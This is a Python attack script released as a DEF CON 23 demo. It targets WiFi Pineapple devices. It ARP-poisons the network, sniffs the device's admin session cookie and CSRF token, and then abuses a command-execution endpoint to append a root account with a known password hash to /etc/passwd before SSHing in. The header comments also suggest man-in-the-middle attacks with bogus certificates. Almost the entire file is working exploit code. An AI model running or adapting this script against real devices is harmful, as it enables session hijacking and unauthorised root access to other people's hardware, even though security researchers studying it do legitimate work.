#!/usr/bin/python
#
# Y'all Hunt Pineapples
# wesley@mcgrewsecurity.com
#
version = '0.9 - DEF CON 23 Not-exactly-weaponized Edition'
#
# ./yallhuntpineapples.py <interface>
#
# Clearly not as clever as it could be, and intentionally so. Take care
# of the following for yourself:
#
#  - Doesn't hop around all the APs looking for WiFi Pineapples
#     - ihuntpineapples.py did this autonomously
#     - ...but seemed like I should make you work for *something*
#     - ...not necessary to demo this attack
#     - ...that code was NASTY
#     - ...maybe best that EVERYONE not have autonomous solutions
#     - Roll it yourself, it's not too hard parsing iwlist, iwconfig, etc.
#     - Throw in some delays, though. WiFi cards hate being thrown
#       around states too quickly.
#  - Shells are fun, but surely you have a nicer payload
#  - Doesn't handle an SSL'd interface (not default in current firmware)
#     - Recommend just MiTM'ing it with a bogus cert, they're
#       probably conditioned to click through certificate errors
#       anyway. Or just don't attack SSL'd pineapples since they at
#       least put some effort into it.
#

gw = ''
default_port = 1471

import time
import signal
import subprocess
import sys
import socket
import urllib
import urllib2
import cookielib
import re
from scapy.all import *

global csrf_token
global session_id

def log(s):
	print '[%s] %s' % (time.asctime(time.localtime()), s)
	return

def get_gateway(iface):
	output = subprocess.check_output(['route','-n'])
	gw = '0.0.0.0'
	try:
		for i in output.split('\n'):
			if len(i.split()) == 8:
				if i.split()[7] == iface:
					gw = i.split()[1]
					if gw != '0.0.0.0':
						break
	except:
		log('No route for %s' % iface)
	return gw

def forwarding_on():
	fp = open('/proc/sys/net/ipv4/ip_forward','w')
	fp.write('1')
	fp.close()
	return

def forwarding_off():
	fp = open('/proc/sys/net/ipv4/ip_forward','w')
	fp.write('0')
	fp.close()
	return

def detect_pineapple(ip):
	url = 'http://%s:%s' % (ip, default_port)
	log('Trying %s' % url)
	request = urllib2.Request(url)
	fp = urllib2.urlopen(request,timeout=5)
	if fp.getcode() == 200:
		data = fp.read()
		fp.close()
		# You can certainly modify your pineapple to beat the detection,
		# or modify this script to be a little less picky.
		if 'mk5_logo' in data:
			return True
	return False

def search_packet(pkt):
	global csrf_token
	global session_id
	try:
		m = re.match(r'.*csrfToken=(\w+)\s.*?Host:\s(\S*?)\s.*PHPSESSID=(\w+)',
		             pkt['TCP']['Raw'].load, re.S)
		if m.group(2) == '%s:%s' % (gw, default_port):
			csrf_token = m.group(1)
			session_id = m.group(3)
			return True
	except:
		return False
	return False

def payload(ip, port, session_id, csrf_token):
	url = 'http://%s:%s/components/system/configuration/functions.php?execute' % (ip, port)

	commands = 'printf "r00t:\$1\$c/YT9wlf\$R7etxG0OnSU.dGtEQj7CG1:0:0:root:/root:/bin/ash\\n" >> /etc/passwd\n'

	post_data = urllib.urlencode({'_csrfToken': csrf_token, 'commands': commands})
	cookie = cookielib.Cookie(None, 'PHPSESSID', session_id, str(port), True, ip, True, False, '/',
	                          True, False, None, False, '', None, None, False)
	cj = cookielib.CookieJar()
	cj.set_cookie(cookie)
	request = urllib2.Request(url,post_data)
	cj.add_cookie_header(request)
	fp = urllib2.urlopen(request)
	data = fp.read()
	fp.close()
	print data
	log('Log in with password \'r00t\'')
	subprocess.call(['ssh','r00t@%s' % ip])
	return

##########################################################

socket.setdefaulttimeout(5)

log('Y\'all Hunt Pineapples')
log(version)

if len(sys.argv) != 3:
	log('Usage: %s <interface> <operator ip>' % sys.argv[0])
	sys.exit(-1)

gw = get_gateway(sys.argv[1])
log('Gateway: %s' % gw)

log('Does this thing look like a pineapple? Checking')
if not detect_pineapple(gw):
	log('Doesn\'t look like a WiFi Pineapple, either isn\'t one or configured differently')
	sys.exit(-1)
log('Looks like a WiFi Pineapple. Going to try poisoning it.')

log('Turning IPv4 forwarding on')
forwarding_on()

# get arp spoofing process going
log('Starting up the arp poisoning.')
devnull = open('/dev/null','w')
ap_proc = subprocess.Popen(['arpspoof','-i',sys.argv[1],'-t',sys.argv[2],'-r',gw],
                           stdout=devnull, stderr=devnull)

# sniff for session cookie
log('Sniffing for a session ID and CSRF token')
sniff(iface=sys.argv[1],store=0,stop_filter=search_packet)
log('PHPSESSID = %s' % session_id)
log('csrfToken = %s' % csrf_token)

log('Telling arpspoof to fix everything back up and quit.')
ap_proc.send_signal(signal.SIGINT) # Interrupt, as with CTRL-C
devnull.close()

log('Running payload:')
payload(gw, default_port, session_id, csrf_token)

log('Making sure arpspoof is done fixing things up.')
ap_proc.wait()
log('Turning IPv4 forwarding off')
forwarding_off()

# ssh in
